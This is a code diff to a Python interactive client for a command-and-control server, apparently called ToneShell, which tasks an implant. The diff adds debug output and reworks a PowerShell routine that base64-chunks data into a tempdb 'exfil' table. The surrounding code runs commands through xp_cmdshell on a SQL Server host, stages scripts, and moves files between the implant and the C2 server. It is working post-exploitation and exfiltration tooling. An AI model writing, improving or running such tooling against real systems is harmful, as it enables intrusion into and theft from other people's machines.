@@ -108,6 +108,8 @@ class XpMssql:
 
     def _exec_q(self, shell, tsql: str) -> str:
         """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
+        if getattr(shell, 'debug', False):
+            print(f"[DBG] TSQL  → {tsql}")
         cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
         return shell.cmd_exec_raw(cmd)
 
@@ -162,6 +164,9 @@ class XpMssql:
 
     def cmd_xpshell_psh(self, shell, script: str):
         """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
+        if getattr(shell, 'debug', False):
+            preview = script[:400] + ('…' if len(script) > 400 else '')
+            print(f"[DBG] PSH   → {preview}")
         ps1 = self._rand_tmp("ps1")
         self._sp_oa_write(shell, ps1, script)
         run_tsql = (
@@ -268,10 +273,11 @@ class XpMssql:
             "$cm.ExecuteNonQuery()|Out-Null;"
             "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
             "for($i=0;$i -lt $n;$i++){"
-            "  $chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
-            "  $cm2=$cn.CreateCommand();"
-            "  $cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$($chunk.Replace(\"'\",\"''\"))'\"+')';"
-            "  $cm2.ExecuteNonQuery()|Out-Null"
+            "$chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
+            "$esc=$chunk.Replace(\"'\",\"''\");"
+            "$cm2=$cn.CreateCommand();"
+            "$cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$esc')\";"
+            "$cm2.ExecuteNonQuery()|Out-Null"
             "};"
             "$cn.Close();"
             "Write-Output 'exfil INSERT done'"
@@ -329,13 +335,14 @@ class XpMssql:
 
 
 class ToneShellShell:
-    def __init__(self, port: str):
+    def __init__(self, port: str, debug: bool = False):
         self.port      = port
         self.base_url  = f"http://localhost:{port}/api/v1.0"
         self.session   = None   # currently attached session GUID
         self.hostname  = None   # display name for the session
         self._task_num = random.randint(1000, 60000)  # random offset avoids taskNum collision on shell restart
         self._xp       = XpMssql()
+        self.debug     = debug
 
     # ── internal helpers ────────────────────────────────────────────────────
 
@@ -353,6 +360,8 @@ class ToneShellShell:
         return d[API_RESP_DATA_KEY]
 
     def _post_json(self, path: str, payload: dict) -> dict:
+        if self.debug:
+            print(f"[DBG] POST  → {path}  {payload}")
         resp = requests.post(f"http://localhost:{self.port}{path}", json=payload)
         return resp.json()
 
@@ -423,14 +432,21 @@ class ToneShellShell:
 
     def cmd_exec_raw(self, command: str) -> str:
         """Send EXEC task, block on poll, return raw output string (no print)."""
+        if self.debug:
+            print(f"[DBG] EXEC  → {command}")
         task_num = self._next_task_num()
         task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
         info     = self._post_task(task)
         output   = self._poll_output(info[TASK_GUID_KEY])
+        if self.debug and output:
+            out_preview = output.strip()[:300] + ('…' if len(output.strip()) > 300 else '')
+            print(f"[DBG] OUT   ← {out_preview}")
         return output or ""
 
     def cmd_get(self, remote_path: str):
         """Pull a file FROM the implant to the C2 server upload dir."""
+        if self.debug:
+            print(f"[DBG] GET   → implant:{remote_path} → C2 uploads/")
         task_num = self._next_task_num()
         task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
         info     = self._post_task(task)
@@ -438,6 +454,8 @@ class ToneShellShell:
 
     def cmd_put_wait(self, payload_name: str, remote_dest: str):
         """Push a file to the implant and block until transfer is complete."""
+        if self.debug:
+            print(f"[DBG] PUT-W → payloads/{payload_name} → implant:{remote_dest}  (blocking)")
         task_num = self._next_task_num()
         task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                     "args": remote_dest, "payload": payload_name}
@@ -447,6 +465,8 @@ class ToneShellShell:
 
     def cmd_put(self, payload_name: str, remote_dest: str):
         """Push a file FROM the C2 server payloads dir TO the implant."""
+        if self.debug:
+            print(f"[DBG] PUT   → payloads/{payload_name} → implant:{remote_dest}")
         task_num = self._next_task_num()
         task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                     "args": remote_dest, "payload": payload_name}
@@ -618,8 +638,10 @@ def main():
     parser = argparse.ArgumentParser(description="Interactive ToneShell C2 shell")
     parser.add_argument("--port", default="9999", metavar="PORT",
                         help="controlServer REST API port (default 9999)")
+    parser.add_argument("--debug", action="store_true",
+                        help="print each command/T-SQL/PS script as it is sent")
     args = parser.parse_args()
-    ToneShellShell(args.port).run()
+    ToneShellShell(args.port, debug=args.debug).run()
 
 
 if __name__ == "__main__":
